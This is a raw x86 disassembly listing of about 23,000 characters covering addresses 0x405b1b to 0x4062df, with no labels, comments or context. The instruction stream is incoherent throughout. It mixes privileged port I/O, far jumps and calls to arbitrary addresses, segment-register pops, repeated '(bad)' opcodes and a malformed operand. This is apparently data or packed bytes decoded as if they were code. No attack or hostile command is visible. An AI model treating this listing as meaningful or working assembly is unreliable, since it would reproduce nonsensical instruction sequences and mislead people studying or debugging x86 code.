  405b1b:	push   es
  405b1c:	aad    0xb9
  405b1e:	push   ds
  405b1f:	pop    edi
  405b20:	sub    bl,BYTE PTR [ebx-0x2124be58]
  405b26:	push   edx
  405b27:	jmp    0x405ad3
  405b29:	mov    eax,0x10fe61d8
  405b2e:	arpl   dx,dx
  405b30:	or     ebx,eax
  405b32:	inc    ebp
  405b33:	in     al,0x1b
  405b35:	cli    
  405b36:	inc    eax
  405b37:	add    ch,0xc2
  405b3a:	je     0x405ad4
  405b3c:	lods   eax,DWORD PTR ds:[esi]
  405b3d:	test   al,0xd8
  405b3f:	and    DWORD PTR [eax+0x2ebf67f],0x8d7b7427
  405b49:	mov    ecx,0xae9ad853
  405b4e:	jg     0x405b4d
  405b50:	or     edi,DWORD PTR [ebx]
  405b52:	mov    BYTE PTR [edx+ecx*4+0x3],ah
  405b56:	dec    eax
  405b57:	adc    BYTE PTR [esi],dl
  405b59:	add    BYTE PTR [ebx+0x719ccf23],dh
  405b5f:	repz and DWORD PTR [ecx],edi
  405b62:	leave  
  405b63:	or     cl,BYTE PTR [ecx-0x1e]
  405b66:	push   eax
  405b67:	jnp    0x405b03
  405b69:	and    ebp,DWORD PTR [edx+eiz*2-0x3090451e]
  405b70:	out    0xc1,al
  405b72:	push   esp
  405b73:	retf   0x6bfa
  405b76:	popa   
  405b77:	into   
  405b78:	data16 icebp 
  405b7a:	arpl   bx,bx
  405b7c:	jge    0x405bb9
  405b7e:	xor    DWORD PTR [ecx],ebp
  405b80:	jo     0x405b0c
  405b82:	xor    bh,cl
  405b84:	jbe    0x405b84
  405b86:	jg     0x405bcc
  405b88:	fs lahf 
  405b8a:	jmp    0xf2403897
  405b8f:	iret   
  405b90:	in     al,dx
  405b91:	repz push eax
  405b93:	pusha  
  405b94:	fimul  DWORD PTR [edx]
  405b96:	or     eax,0x51fc3bfd
  405b9b:	fwait
  405b9c:	hlt    
  405b9d:	cwde   
  405b9e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ba0:	xor    al,dh
  405ba2:	xor    ebx,DWORD PTR [esp+eiz*8]
  405ba5:	and    ecx,DWORD PTR [ecx]
  405ba7:	xchg   ebx,eax
  405ba8:	ds xor ecx,ebp
  405bab:	mov    ecx,ebp
  405bad:	push   es
  405bae:	fcomp  DWORD PTR [ebp+0x449f503f]
  405bb4:	repnz xlat BYTE PTR ds:[ebx]
  405bb6:	lods   eax,DWORD PTR ds:[esi]
  405bb7:	ret    
  405bb8:	sti    
  405bb9:	and    DWORD PTR [ebx],ebx
  405bbb:	pop    ss
  405bbc:	shr    BYTE PTR [edx+0x3b],cl
  405bbf:	mov    esi,0xef370469
  405bc4:	pop    edi
  405bc5:	and    DWORD PTR [edi],0x9f95d26
  405bcb:	add    esi,edx
  405bcd:	shr    BYTE PTR [ebx+0x5eb8aa9f],cl
  405bd3:	enter  0x565,0x42
  405bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bd8:	mov    ecx,0x86927e90
  405bdd:	ins    DWORD PTR es:[edi],dx
  405bde:	in     eax,0x3
  405be0:	dec    esp
  405be1:	mov    ch,0x3a
  405be3:	cmp    DWORD PTR ds:0x45e863f8,ebp
  405be9:	(bad)  
  405bea:	jmp    0x405baa
  405bec:	sub    eax,0xf8584bcc
  405bf1:	sahf   
  405bf2:	add    eax,0x2966b74c
  405bf7:	test   BYTE PTR [esi-0x7c],0xce
  405bfb:	jecxz  0x405c1f
  405bfd:	dec    bx
  405bff:	pop    ebx
  405c00:	pop    ebx
  405c01:	and    BYTE PTR ds:0xa08252c0,cl
  405c07:	or     al,0xaf
  405c09:	mov    ch,0xd4
  405c0b:	fstp   DWORD PTR [ecx]
  405c0d:	leave  
  405c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c0f:	mov    ch,0xb7
  405c11:	mov    bh,0xaa
  405c13:	repz ficomp DWORD PTR [esi+0x1980e3b5]
  405c1b:	inc    edx
  405c1c:	fisttp WORD PTR [edx-0x2e]
  405c1f:	test   eax,0xe1ab244
  405c24:	inc    edi
  405c25:	outs   dx,BYTE PTR ds:[esi]
  405c26:	xchg   esp,eax
  405c27:	popf   
  405c28:	or     eax,0x60
  405c2b:	dec    edi
  405c2c:	ret    0xff82
  405c2f:	fwait
  405c30:	scas   al,BYTE PTR es:[edi]
  405c31:	xchg   edx,eax
  405c32:	add    edx,edi
  405c34:	push   ebx
  405c35:	ins    BYTE PTR es:[edi],dx
  405c36:	aas    
  405c37:	xor    DWORD PTR [ecx-0x3a],eax
  405c3a:	jo     0x405cb2
  405c3c:	ins    BYTE PTR es:[edi],dx
  405c3d:	mov    cl,0x51
  405c3f:	jecxz  0x405bcc
  405c41:	mov    ecx,0xb35f7ccb
  405c46:	cmp    esi,DWORD PTR [edx]
  405c48:	and    al,0x6d
  405c4a:	into   
  405c4b:	dec    edi
  405c4c:	mov    al,ds:0x5c3130e1
  405c51:	add    al,0xca
  405c53:	lds    esp,FWORD PTR ds:0x46aea00f
  405c59:	push   ebp
  405c5a:	sub    eax,0x99e030e9
  405c5f:	out    dx,al
  405c60:	ror    BYTE PTR [eax+0x601f34d6],cl
  405c66:	and    eax,0x5c208765
  405c6b:	dec    edx
  405c6c:	sahf   
  405c6d:	es test BYTE PTR cs:[ebx-0x17c64001],bh
  405c75:	jle    0x405c76
  405c77:	cdq    
  405c78:	popa   
  405c79:	pop    ds
  405c7a:	std    
  405c7b:	jp     0x405c38
  405c7d:	mov    dl,0x68
  405c7f:	test   BYTE PTR [esi],0x9c
  405c82:	es mov ah,0x8
  405c85:	push   0x22
  405c87:	xlat   BYTE PTR ds:[ebx]
  405c88:	loope  0x405ca3
  405c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c8b:	mov    BYTE PTR [edx],0xa7
  405c8e:	repnz test al,0xf9
  405c91:	push   ecx
  405c92:	inc    edi
  405c93:	cmp    al,0x8c
  405c95:	dec    esp
  405c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c97:	out    dx,al
  405c98:	xor    esp,DWORD PTR [esi+edx*1]
  405c9b:	aaa    
  405c9c:	imul   ebx,DWORD PTR [ebp-0x4c],0xec91bd5c
  405ca3:	push   cs
  405ca4:	cwde   
  405ca5:	cmp    al,BYTE PTR [ebx-0x1361fcf9]
  405cab:	xor    ebx,ebp
  405cad:	sbb    eax,DWORD PTR [edx]
  405caf:	sub    eax,DWORD PTR [ecx+edx*1+0x2dacd2f4]
  405cb6:	aad    0xb1
  405cb8:	adc    cl,ah
  405cba:	loopne 0x405d19
  405cbc:	lahf   
  405cbd:	xchg   esp,eax
  405cbe:	mov    dl,0x38
  405cc0:	mov    ch,0xef
  405cc2:	popa   
  405cc3:	aas    
  405cc4:	ja     0x405c72
  405cc6:	inc    ebx
  405cc7:	xlat   BYTE PTR ds:[ebx]
  405cc8:	sbb    bh,BYTE PTR [ebx-0x5b]
  405ccb:	pushf  
  405ccc:	gs je  0x405ccc
  405ccf:	int3   
  405cd0:	add    edx,edx
  405cd2:	ja     0x405d46
  405cd4:	icebp  
  405cd5:	imul   edi,DWORD PTR ds:0xded8001c,0xd
  405cdc:	xlat   BYTE PTR ds:[ebx]
  405cdd:	sbb    DWORD PTR [ebx-0x72501336],ecx
  405ce3:	ds dec esp
  405ce5:	xchg   esi,eax
  405ce6:	popa   
  405ce7:	in     al,0x2a
  405ce9:	call   0x4dd3b8d2
  405cee:	mov    ecx,0x2a646859
  405cf3:	mov    bh,0x5f
  405cf5:	cs mov dl,0x89
  405cf8:	xchg   edx,eax
  405cf9:	loop   0x405c9b
  405cfb:	loope  0x405d2b
  405cfd:	pop    ds
  405cfe:	ds ins DWORD PTR es:[edi],dx
  405d00:	xchg   edi,eax
  405d01:	cld    
  405d02:	xchg   esp,eax
  405d03:	call   0x424fef7b
  405d08:	fidiv  DWORD PTR [ebx+0x4582a8ea]
  405d0e:	outs   dx,BYTE PTR ds:[si]
  405d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d11:	sub    eax,DWORD PTR [ebp+0x45897f6c]
  405d17:	data16 jl 0x405d03
  405d1a:	pop    esp
  405d1b:	or     DWORD PTR [ebp+0x36cd4e26],esp
  405d21:	gs retf 
  405d23:	hlt    
  405d24:	dec    esi
  405d25:	(bad)  
  405d26:	jge    0x405d7f
  405d28:	mov    esp,0xe00d1c00
  405d2d:	sub    al,0x9d
  405d2f:	mov    BYTE PTR [ebx-0x1e],bl
  405d32:	xchg   ebp,eax
  405d33:	and    eax,0x99f88de
  405d38:	inc    ecx
  405d39:	adc    dl,BYTE PTR [edi-0x10]
  405d3c:	pop    ecx
  405d3d:	int    0x47
  405d3f:	xchg   ebp,eax
  405d40:	popf   
  405d41:	cmp    dl,BYTE PTR [ebp+0x36]
  405d44:	nop
  405d45:	adc    eax,0xfb3d2df1
  405d4a:	scas   eax,DWORD PTR es:[edi]
  405d4b:	cmp    al,0xb3
  405d4d:	add    eax,0x58f9ca06
  405d52:	jns    0x405d10
  405d54:	pop    esp
  405d55:	cs gs stc 
  405d58:	cmc    
  405d59:	xchg   ebx,eax
  405d5a:	inc    ebx
  405d5b:	inc    ebx
  405d5c:	sub    eax,0xbe98659a
  405d61:	fst    QWORD PTR [ebp+0xb1d60b8]
  405d67:	iret   
  405d68:	inc    esp
  405d69:	frstor [eax]
  405d6b:	mov    ch,bl
  405d6d:	retf   0x5f0e
  405d70:	sub    edi,DWORD PTR [eax-0x5ec14e85]
  405d76:	jnp    0x405d31
  405d78:	sub    al,0xe1
  405d7a:	adc    eax,0x89d82c03
  405d7f:	ins    WORD PTR es:[edi],dx
  405d81:	sub    al,0x8
  405d83:	sbb    eax,0x26fea394
  405d88:	inc    ecx
  405d89:	push   eax
  405d8a:	rcl    BYTE PTR ds:0xbc78856d,1
  405d90:	dec    esi
  405d91:	inc    ebx
  405d92:	dec    edi
  405d93:	add    al,0x2a
  405d95:	cdq    
  405d96:	mov    BYTE PTR [ecx-0x53],ah
  405d99:	and    BYTE PTR [eax-0x7799e28b],0xef
  405da0:	add    dh,BYTE PTR [ebp-0x30a97da]
  405da6:	mov    dh,0xd3
  405da8:	test   dh,bh
  405daa:	fwait
  405dab:	push   ds
  405dac:	retf   
  405dad:	je     0x405dfd
  405daf:	sub    BYTE PTR [ecx+0x381ae950],0x3f
  405db6:	cmp    ch,BYTE PTR [esi+0x56cd2208]
  405dbc:	sub    DWORD PTR [eax-0x769a4ca8],ebp
  405dc2:	mov    ecx,0x7287617c
  405dc7:	xor    ecx,DWORD PTR [edi]
  405dc9:	les    esi,FWORD PTR [edi-0x5af0f4a]
  405dcf:	pop    es
  405dd0:	jnp    0x405d72
  405dd2:	mov    ds:0xb046efdb,eax
  405dd7:	dec    eax
  405dd8:	jb     0x405dc1
  405dda:	out    0xed,eax
  405ddc:	xchg   esp,eax
  405ddd:	adc    DWORD PTR [esi+0x5ceef86e],esi
  405de3:	cld    
  405de4:	pop    ebx
  405de5:	in     eax,dx
  405de6:	enter  0xec47,0xef
  405dea:	mov    esi,0xb232c5b7
  405def:	mov    ch,0x5d
  405df1:	sar    DWORD PTR [esi-0x5b461f7a],cl
  405df7:	xor    BYTE PTR [edi+0x425081ba],ch
  405dfd:	cmp    DWORD PTR [ebx-0x5b2d2e09],edx
  405e03:	idiv   BYTE PTR [ebp+edi*4+0x5f785e16]
  405e0a:	into   
  405e0b:	dec    ebx
  405e0c:	(bad)  
  405e0d:	popa   
  405e0e:	in     eax,dx
  405e0f:	pop    eax
  405e10:	mov    bl,0xba
  405e12:	dec    eax
  405e13:	scas   eax,DWORD PTR es:[edi]
  405e14:	mov    cl,0xb8
  405e16:	pop    edx
  405e17:	(bad)  
  405e18:	mov    dh,0x45
  405e1a:	loopne 0x405dff
  405e1c:	xchg   esi,eax
  405e1d:	(bad)  
  405e1e:	ins    DWORD PTR es:[edi],dx
  405e1f:	or     DWORD PTR [ebx+0x2a312d23],0x93965ccb
  405e29:	std    
  405e2a:	and    ebx,ebp
  405e2c:	jecxz  0x405e37
  405e2e:	jge    0x405eab
  405e30:	mov    ecx,0x26ee6c49
  405e35:	(bad)  
  405e36:	cmp    eax,0xfc710a89
  405e3b:	out    dx,eax
  405e3c:	jmp    0x405eae
  405e3e:	jno    0x405de9
  405e40:	retf   0x52fc
  405e43:	jp     0x405e3a
  405e45:	scas   eax,DWORD PTR es:[edi]
  405e46:	imul   ecx,DWORD PTR [edi],0xffffffbc
  405e49:	retf   
  405e4a:	or     al,0x1a
  405e4c:	xor    DWORD PTR [eax-0x49dddf71],0x20f11e6d
  405e56:	pusha  
  405e57:	jno    0x405ebf
  405e59:	retf   0x4d34
  405e5c:	push   ebx
  405e5d:	cdq    
  405e5e:	dec    esi
  405e5f:	or     al,0xe7
  405e61:	rol    DWORD PTR [esi+0x4b],1
  405e64:	repnz test DWORD PTR [edi],edi
  405e67:	dec    ecx
  405e68:	pop    esi
  405e69:	cs dec eax
  405e6b:	mov    ecx,0x6f603be
  405e70:	jne    0x405e28
  405e72:	popa   
  405e73:	aam    0x45
  405e75:	shr    BYTE PTR [edi*1+0x2e29cc0b],cl
  405e7c:	adc    cl,BYTE PTR [esi+0x2686bc1f]
  405e82:	or     eax,0x1a2b737c
  405e87:	jl     0x405e37
  405e89:	cmp    cl,BYTE PTR [edx-0x51ef14fc]
  405e8f:	jno    0x405e1f
  405e91:	sbb    eax,0x850c8af1
  405e96:	pop    esi
  405e97:	xor    eax,0x4ba76c20
  405e9c:	aas    
  405e9d:	inc    edi
  405e9e:	or     DWORD PTR fs:[esi-0x6a],esp
  405ea2:	ror    DWORD PTR [ebx+0x4ed7ee07],cl
  405ea8:	mov    BYTE PTR [eax-0x55],al
  405eab:	cmp    al,dh
  405ead:	inc    esi
  405eae:	inc    esi
  405eaf:	je     0x405ee6
  405eb1:	sub    ecx,DWORD PTR [edx]
  405eb3:	push   ebx
  405eb4:	mov    ?,esp
  405eb6:	fstp   DWORD PTR [esi+0x11997205]
  405ebc:	xchg   esp,eax
  405ebd:	das    
  405ebe:	adc    al,0x46
  405ec0:	ins    BYTE PTR es:[edi],dx
  405ec1:	fcomp  DWORD PTR [ebp+0x24]
  405ec4:	jo     0x405ed5
  405ec6:	xor    edx,DWORD PTR [eax*8-0x778c165e]
  405ecd:	dec    ebp
  405ece:	popf   
  405ecf:	sti    
  405ed0:	cdq    
  405ed1:	ins    DWORD PTR es:[edi],dx
  405ed2:	xchg   BYTE PTR [edi-0x2a],bh
  405ed5:	mov    ebx,0xdfa7c1e8
  405eda:	ret    0xaeb0
  405edd:	aad    0xef
  405edf:	inc    edi
  405ee0:	aas    
  405ee1:	popa   
  405ee2:	push   es
  405ee3:	xor    BYTE PTR [esi-0x46fdedab],ah
  405ee9:	mov    edi,0xa8dd5eb
  405eee:	sub    eax,0x13d6dc78
  405ef3:	(bad)  [ebp+0x38]
  405ef6:	sub    eax,0xf6c14d45
  405efb:	in     al,0x2f
  405efd:	(bad)  
  405efe:	jnp    0x405f7b
  405f00:	popf   
  405f01:	in     al,dx
  405f02:	xor    al,0x45
  405f04:	mov    dh,0xd
  405f06:	push   es
  405f07:	divps  xmm2,XMMWORD PTR [edi]
  405f0a:	add    edi,edx
  405f0c:	stos   DWORD PTR es:[edi],eax
  405f0d:	loope  0x405ea4
  405f0f:	add    eax,0xb834979b
  405f14:	bound  ebp,QWORD PTR [ebx+0x507fda84]
  405f1a:	pop    ds
  405f1b:	and    al,0x8
  405f1d:	cld    
  405f1e:	mov    BYTE PTR es:[ebx-0x771e68b6],dl
  405f25:	cdq    
  405f26:	pushf  
  405f27:	out    dx,eax
  405f28:	lds    esi,FWORD PTR [eax]
  405f2a:	iret   
  405f2b:	sub    edi,esi
  405f2d:	pushf  
  405f2e:	std    
  405f2f:	add    DWORD PTR ds:0x3fab8e02,edi
  405f35:	mov    edi,0xa0245a80
  405f3a:	push   esi
  405f3b:	lods   eax,DWORD PTR ds:[esi]
  405f3c:	addr16 mov edx,0xab381151
  405f42:	punpcklwd mm6,DWORD PTR [eax]
  405f45:	push   ecx
  405f46:	dec    ecx
  405f47:	inc    ebx
  405f48:	fs iret 
  405f4a:	push   es
  405f4b:	push   ecx
  405f4c:	mov    ebx,0x116b6c6d
  405f51:	xchg   ebp,eax
  405f52:	jns    0x405f2d
  405f54:	(bad)  
  405f55:	ror    DWORD PTR [ecx],cl
  405f57:	and    edx,edi
  405f59:	into   
  405f5a:	xchg   BYTE PTR [edx+0x62],dh
  405f5d:	js     0x405fc8
  405f5f:	inc    ebx
  405f60:	inc    ebx
  405f61:	sub    ebp,esp
  405f63:	lods   eax,DWORD PTR ds:[esi]
  405f64:	mov    dh,0x29
  405f66:	mov    ds:0x64fd470c,al
  405f6b:	xlat   BYTE PTR ds:[ebx]
  405f6c:	fimul  DWORD PTR [ebx+0x43]
  405f6f:	jnp    0x405f71
  405f71:	add    al,0x47
  405f73:	adc    edx,ebx
  405f75:	mov    BYTE PTR [ebx-0x4ce3279],bh
  405f7b:	pop    edi
  405f7c:	fiadd  DWORD PTR [ebx-0x2311999e]
  405f82:	fst    st(5)
  405f84:	call   0x7055:0xf77236d7
  405f8b:	leave  
  405f8c:	push   cs
  405f8d:	loop   0x405fb5
  405f8f:	lds    ecx,FWORD PTR [edi+0xe155efd]
  405f95:	scas   al,BYTE PTR es:[edi]
  405f96:	xor    al,0xf1
  405f98:	xor    ah,BYTE PTR [edi+0x7f]
  405f9b:	xor    al,0xd7
  405f9d:	xor    ch,ah
  405f9f:	add    ebx,DWORD PTR [edi+0x29]
  405fa2:	lahf   
  405fa3:	in     eax,0x65
  405fa5:	cld    
  405fa6:	xor    eax,0xd1015d8f
  405fab:	fcom   DWORD PTR [ebp+0x7e4e1c82]
  405fb1:	cmp    eax,0xf5635f1
  405fb6:	xor    eax,0xbd9e2806
  405fbb:	push   eax
  405fbc:	jl     0x405ffe
  405fbe:	push   esi
  405fbf:	fnsave [ebx+0x42]
  405fc2:	adc    al,0x65
  405fc4:	dec    edx
  405fc5:	fld    QWORD PTR [esp+ebx*4-0x48]
  405fc9:	out    dx,al
  405fca:	(bad)  
  405fcb:	fidivr DWORD PTR [ebx+0x45]
  405fce:	outs   dx,DWORD PTR ds:[esi]
  405fcf:	adc    dh,BYTE PTR [edx]
  405fd1:	test   ebx,ecx
  405fd3:	xor    al,0x1e
  405fd5:	jmp    0xe32b97fd
  405fda:	xor    al,0xc8
  405fdc:	push   0x1faec500
  405fe1:	and    eax,0xe66292ce
  405fe6:	jp     0x406021
  405fe8:	rcr    BYTE PTR [eax+0x3ac255a7],1
  405fee:	(bad)  
  405fef:	mov    eax,ds:0xea54762b
  405ff4:	pop    es
  405ff5:	jne    0x406072
  405ff7:	stos   DWORD PTR es:[edi],eax
  405ff8:	cmp    ecx,DWORD PTR [ebx+0x275c79cc]
  405ffe:	or     ch,BYTE PTR ds:0x2ef54530
  406004:	popf   
  406005:	int3   
  406006:	mov    dl,BYTE PTR [edx-0x40]
  406009:	or     cl,cl
  40600b:	pop    eax
  40600c:	mov    esi,0xa752ee11
  406011:	cmp    eax,0xff4be2f7
  406016:	rol    BYTE PTR [eax+0x621684f3],cl
  40601c:	dec    esp
  40601d:	out    0xff,eax
  40601f:	rol    BYTE PTR [ebx+0x2f9217f9],1
  406025:	les    eax,FWORD PTR ds:0xd80
  40602a:	mov    ah,0xfe
  40602c:	xchg   DWORD PTR [eiz*4-0x5f6028cd],edx
  406033:	cdq    
  406034:	jecxz  0x406083
  406036:	pop    ds
  406037:	sub    bh,BYTE PTR ds:0x95850c67
  40603d:	test   al,0x36
  40603f:	bound  edx,QWORD PTR [eax-0x51bcc60a]
  406045:	data16 js 0x4060bf
  406048:	outs   dx,BYTE PTR ds:[esi]
  406049:	lahf   
  40604a:	mov    ebx,0xf08a57b9
  40604f:	push   ebp
  406050:	divps  xmm4,XMMWORD PTR [ecx-0x77973f58]
  406057:	dec    esi
  406058:	adc    esi,esi
  40605a:	mov    ecx,0xb124759
  40605f:	clc    
  406060:	xor    ch,bh
  406062:	mov    ah,cl
  406064:	mov    ds:0x8d3a3dfd,eax
  406069:	ins    DWORD PTR es:[edi],dx
  40606a:	pushf  
  40606b:	push   edi
  40606c:	out    0xcf,eax
  40606e:	and    al,0x4a
  406070:	or     ah,ah
  406072:	mov    cl,0xfd
  406074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406075:	call   0xe3bb485a
  40607a:	dec    edi
  40607b:	jns    0x406059
  40607d:	pop    ebx
  40607e:	int    0x17
  406080:	jecxz  0x406037
  406082:	mov    DWORD PTR [ecx],ebx
  406084:	xor    BYTE PTR [edx+0x5638f5f5],0xae
  40608b:	pop    esp
  40608c:	pop    esp
  40608d:	fmul   QWORD PTR [ebx-0x39d4aa10]
  406093:	dec    dh
  406095:	pmullw mm4,QWORD PTR [ebx+esi*1+0x7a66725d]
  40609d:	(bad)  
  40609e:	rcl    BYTE PTR [eax-0x156050a0],1
  4060a4:	arpl   WORD PTR [ebx],ax
  4060a6:	fidivr DWORD PTR [edx-0x34]
  4060a9:	jle    0x406030
  4060ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ac:	lods   al,BYTE PTR ds:[esi]
  4060ad:	or     ecx,ebp
  4060af:	pop    es
  4060b0:	scas   al,BYTE PTR es:[edi]
  4060b1:	and    al,0xe
  4060b3:	add    edx,DWORD PTR [edx-0x769a8a2f]
  4060b9:	gs inc esp
  4060bb:	xchg   BYTE PTR [edi-0x28c87dfe],dh
  4060c1:	out    dx,eax
  4060c2:	sbb    eax,edx
  4060c4:	mov    ch,0x61
  4060c6:	popf   
  4060c7:	xchg   bh,bh
  4060c9:	jno    0x40610c
  4060cb:	ret    0xa2fe
  4060ce:	push   ecx
  4060cf:	add    DWORD PTR [ebp+0x1acbdfb9],edx
  4060d5:	(bad)  
  4060d6:	test   eax,0x9f024094
  4060db:	daa    
  4060dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060dd:	test   eax,0x3b3e73eb
  4060e2:	mov    sp,0x6d7e
  4060e6:	sub    ebp,DWORD PTR [ecx+0x35]
  4060e9:	pop    edi
  4060ea:	xor    DWORD PTR [eax+esi*8],ebx
  4060ed:	xor    ch,dh
  4060ef:	adc    DWORD PTR [edi-0x1763b950],ebx
  4060f5:	ins    BYTE PTR es:[edi],dx
  4060f6:	pop    edx
  4060f7:	pop    ecx
  4060f8:	es mov dh,0xf5
  4060fb:	and    al,0x4f
  4060fd:	push   ds
  4060fe:	lahf   
  4060ff:	imul   ebx,DWORD PTR [esp+edi*8-0x45],0x3c9e34fd
  406107:	fnstcw WORD PTR [ebp-0x2749e2a2]
  40610d:	jle    0x406185
  40610f:	data16 (bad) 
  406111:	lahf   
  406112:	cmp    eax,DWORD PTR [esi+ebx*4+0x55c535b3]
  406119:	aas    
  40611a:	pop    ds
  40611b:	repz mov ah,0x31
  40611e:	sbb    eax,DWORD PTR [ecx-0x6c2d6e0e]
  406124:	(bad)  
  406125:	mov    eax,0x9604d5bc
  40612a:	sbb    al,bh
  40612c:	or     ebx,edi
  40612e:	xchg   esi,eax
  40612f:	stc    
  406130:	scas   al,BYTE PTR es:[edi]
  406131:	and    edi,DWORD PTR [eax+edi*2+0x6e]
  406135:	sbb    esp,DWORD PTR [esi+0x1a]
  406138:	inc    BYTE PTR [ebp-0x51]
  40613b:	push   edx
  40613c:	je     0x406112
  40613e:	dec    esp
  40613f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406140:	inc    edx
  406141:	pusha  
  406142:	cwde   
  406143:	(bad)  
  406144:	js     0x406114
  406146:	shl    DWORD PTR [ecx-0x1b79bcaa],1
  40614c:	inc    ecx
  40614d:	adc    ch,cl
  40614f:	cmp    al,0xa3
  406151:	and    BYTE PTR [edx+edx*2+0x6e0ade40],bl
  406158:	pushf  
  406159:	loopne 0x40610e
  40615b:	fbstp  TBYTE PTR [ebx]
  40615d:	xchg   esi,eax
  40615e:	outs   dx,DWORD PTR ds:[esi]
  40615f:	stc    
  406160:	ss inc BYTE PTR ds:[ecx]
  406164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406165:	ins    BYTE PTR es:[edi],dx
  406166:	call   0x46eb:0xb676ab36
  40616d:	in     al,dx
  40616e:	popf   
  40616f:	sub    cl,ah
  406171:	sub    ch,BYTE PTR [edi]
  406173:	dec    edi
  406174:	xor    ebx,DWORD PTR [edi]
  406176:	jmp    0xc1109375
  40617b:	adc    ah,BYTE PTR [eax+0x7c]
  40617e:	sbb    eax,0x4562828b
  406183:	mov    al,ds:0xfd629648
  406188:	sbb    DWORD PTR [ebx-0x392464a2],esi
  40618e:	xor    eax,0xb6bf4c99
  406193:	les    ecx,FWORD PTR [eax+0x5300ee30]
  406199:	adc    esp,DWORD PTR [edx]
  40619b:	push   es
  40619c:	pop    eax
  40619d:	dec    ebp
  40619e:	adc    esi,DWORD PTR [edx+0x77]
  4061a1:	jp     0x4061ec
  4061a3:	mov    bl,0xce
  4061a5:	nop
  4061a6:	(bad)  
  4061a7:	mov    al,0x93
  4061a9:	mov    al,ds:0xbbd9282
  4061ae:	out    0x3b,al
  4061b0:	dec    edi
  4061b1:	or     BYTE PTR [esi-0x3b0be09f],dh
  4061b7:	ins    BYTE PTR es:[edi],dx
  4061b8:	mov    al,ds:0xa1e895ea
  4061bd:	clc    
  4061be:	xor    al,0x12
  4061c0:	add    eax,0x7cc75616
  4061c5:	cmp    eax,0x9c702cb3
  4061ca:	clc    
  4061cb:	fldpi  
  4061cd:	mov    BYTE PTR [edx+0x556b39f8],0xc7
  4061d4:	dec    edx
  4061d5:	pop    es
  4061d6:	mov    DWORD PTR [ecx],ebx
  4061d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061d9:	bswap  esp
  4061db:	rcr    DWORD PTR [ecx-0x14619369],cl
  4061e1:	jne    0x406250
  4061e3:	mov    edi,0x65b469b9
  4061e8:	add    BYTE PTR [ebp+0x28],0xbb
  4061ec:	dec    eax
  4061ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061ee:	mov    eax,0x35840407
  4061f3:	and    al,0xa3
  4061f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061f6:	(bad)  
  4061f7:	in     al,0x31
  4061f9:	and    DWORD PTR [edi+0x8],edx
  4061fc:	imul   esp,DWORD PTR ds:0x47f28103,0x2d719829
  406206:	jns    0x4061a5
  406208:	jae    0x4061e2
  40620a:	popa   
  40620b:	mov    BYTE PTR [edi-0x20fe929e],dh
  406211:	js     0x406208
  406213:	xlat   BYTE PTR ds:[ebx]
  406214:	cmp    BYTE PTR [ebx+0x3e],0xbb
  406218:	sbb    cl,0xcc
  40621b:	rol    DWORD PTR [esi],0xd3
  40621e:	out    dx,eax
  40621f:	scas   al,BYTE PTR es:[edi]
  406220:	adc    cl,BYTE PTR [edx]
  406222:	adc    al,0xbc
  406224:	mov    bl,0xfd
  406226:	lods   al,BYTE PTR ds:[esi]
  406227:	sbb    eax,0xbf0816c7
  40622c:	aaa    
  40622d:	aam    0x72
  40622f:	imul   cx,WORD PTR [edx-0x3b],0xbafa
  406235:	or     DWORD PTR [eax],edx
  406237:	jns    0x406253
  406239:	add    edx,0x22134bad
  40623f:	hlt    
  406240:	stos   DWORD PTR es:[edi],eax
  406241:	push   ss
  406242:	inc    ecx
  406243:	arpl   WORD PTR [ebx+0x51d565de],si
  406249:	push   0xffffffd7
  40624b:	jno    0x40628e
  40624d:	dec    eax
  40624e:	das    
  40624f:	push   ecx
  406250:	mov    eax,0x3baf28f3
  406255:	lahf   
  406256:	sbb    ah,BYTE PTR [ecx]
  406258:	ss jg  0x406285
  40625b:	cmp    eax,0x3d2ab11f
  406260:	cmp    BYTE PTR [edx],al
  406262:	dec    esp
  406263:	(bad)  
  406264:	popa   
  406265:	inc    edx
  406266:	ja     0x4062cc
  406268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406269:	(bad)  
  40626a:	sub    eax,0x7ad24ec9
  40626f:	mov    edi,0xd0be7018
  406274:	mov    es,WORD PTR [esi+edx*2-0x3935ddba]
  40627b:	xchg   ebp,eax
  40627c:	lods   al,BYTE PTR ds:[esi]
  40627d:	mov    ch,0x4e
  40627f:	jge    0x406204
  406281:	add    esi,eax
  406283:	std    
  406284:	xor    DWORD PTR [ecx],ebp
  406286:	pushf  
  406287:	push   ebp
  406288:	cmp    al,0x7
  40628a:	js     0x406301
  40628c:	clc    
  40628d:	rcr    edx,cl
  40628f:	adc    DWORD PTR [eax-0x7bba7de6],edx
  406295:	jmp    0x5e383986
  40629a:	in     eax,0x13
  40629c:	inc    edx
  40629d:	cmp    DWORD PTR [edx-0x4e3cba02],ebp
  4062a3:	jae    0x4062cc
  4062a5:	ins    DWORD PTR es:[edi],dx
  4062a6:	daa    
  4062a7:	in     eax,0x87
  4062a9:	enter  0x8170,0x0
  4062ad:	ds jmp 0xb5661374
  4062b3:	mov    al,ds:0x958875e7
  4062b8:	rcl    BYTE PTR [edx-0x35],cl
  4062bb:	adc    DWORD PTR [ebx],edx
  4062bd:	sti    
  4062be:	daa    
  4062bf:	xor    BYTE PTR [edi+0x2d3494fe],dl
  4062c5:	pop    ecx
  4062c6:	and    DWORD PTR [ebx],eax
  4062c8:	lahf   
  4062c9:	iret   
  4062ca:	sar    DWORD PTR [edx-0x73909e7d],0x7
  4062d1:	cmp    bl,bh
  4062d3:	pop    esi
  4062d4:	push   ss
  4062d5:	and    bh,dl
  4062d7:	adc    eax,0xcc830b06
  4062dc:	inc    ebp
  4062dd:	sub    esi,ebp
  4062df:	dec    ebx
